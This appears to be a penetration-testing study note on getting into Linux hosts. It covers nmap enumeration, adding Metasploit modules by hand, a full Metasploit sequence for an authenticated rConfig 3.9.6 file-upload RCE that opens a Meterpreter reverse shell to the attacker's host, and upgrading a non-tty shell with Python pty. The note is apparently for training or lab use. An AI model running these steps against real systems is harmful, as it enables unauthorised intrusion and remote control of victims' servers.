# Infiltrating Unix/Linux

Standard enum first — OS, web stack versions, running services all feed exploit selection:

```bash
nmap -sC -sV <TARGET>
```

App version in the web UI footer → Google `<app> <version> vulnerability` + check MSF search + check GitHub for modules not yet in local MSF install.

If MSF search misses a known exploit, find the `.rb` on Rapid7's GitHub, drop it into:

```
/usr/share/metasploit-framework/modules/exploits/linux/http/
```

Then `use exploit/linux/http/<module>` — MSF picks it up without restart.

rConfig 3.9.6 authenticated file upload RCE — lands Meterpreter as `apache`:

```
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
set RHOSTS <TARGET>
set LHOST <LHOST>
exploit
```

Drop to system shell from Meterpreter:

```
meterpreter > shell
```

---

No prompt after dropping into shell = non-tty shell — `su`/`sudo` won't work. Upgrade with Python if present:

```bash
which python python3
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> [!tip] Non-tty shell is the default when a web app process (apache, www-data) executes your payload — those accounts have no TTY defined in their environment. Always upgrade before attempting privesc steps that need `su` or `sudo`.